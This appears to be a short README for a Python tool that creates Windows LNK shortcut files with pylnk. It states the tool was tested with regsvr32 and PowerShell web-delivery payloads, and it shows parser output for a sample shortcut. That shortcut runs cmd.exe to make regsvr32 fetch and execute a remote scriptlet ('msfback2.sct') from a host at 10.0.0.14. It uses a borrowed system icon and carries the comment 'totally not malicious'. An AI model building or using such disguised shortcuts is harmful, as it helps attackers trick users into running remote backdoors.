# python_lnk_maker
Make Windows LNK file with python (pylnk)

Uses pylnk  to create a Windows LNK file.

* pip install pylnk

* tested using regsvr32 trick and powershell web delivery payload

* set link.icon to the executable you want to use for the LNK icon. 

Run this on a Windows system with python 2.7 and pylnk installed


Output of lnk_parser_cmd.exe
```
C:\Users\user\Desktop>lnk_parser_cmd.exe blah4.lnk
[Filename]:                             blah4.lnk

[Header]
Date created:                           06/04/2016 (00:36:12.0) [UTC]
Last accessed:                          06/04/2016 (00:36:12.0) [UTC]
Last modified:                          06/04/2016 (00:36:12.0) [UTC]
File size:                              0 bytes
File attributes:                        0x00000000      (None)
Icon index:                             0
ShowWindow value:                       1               (SW_SHOWNORMAL / SW_NORMAL)
Hot key value:                          0x0000          (None)
Link flags:                             0x0000016d      (HasLinkTargetIDList, HasName, HasRelativePath, HasArguments, HasIconLocation, ForceNoLinkInfo)

[Link Target ID List]
CLSID:                                  20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer

Drive:                                  C:\

Last modified:                          03/16/2016 (09:56:04.0) [UTC]
Folder attributes:                      0x00000010      (FILE_ATTRIBUTE_DIRECTORY)
Short directory name:                   windows
Last accessed:                          03/16/2016 (09:56:04.0) [UTC]
Long directory name:                    windows

Last modified:                          06/03/2016 (17:35:24.0) [UTC]
Folder attributes:                      0x00000010      (FILE_ATTRIBUTE_DIRECTORY)
Short directory name:                   System32
Last accessed:                          06/03/2016 (17:35:24.0) [UTC]
Long directory name:                    System32

File size:                              233984 bytes
Last modified:                          10/30/2015 (00:17:34.0) [UTC]
File attributes:                        0x00000010      (FILE_ATTRIBUTE_DIRECTORY)
8.3 filename:                           cmd.exe
Date created:                           10/30/2015 (00:17:34.0) [UTC]
Last accessed:                          10/30/2015 (00:17:34.0) [UTC]
Long filename:                          cmd.exe

[String Data]
Comment (ASCII):                        totally not malicious :-)
Relative path (ASCII):                  C:\Windows\System32\cmd.exe
Arguments (ASCII):                      /c regsvr32 /s /n /u /i:http://10.0.0.14:8000/msfback2.sct scrobj.dll
Icon location (ASCII):                  C:\Windows\System32\cliconfg.exe
```


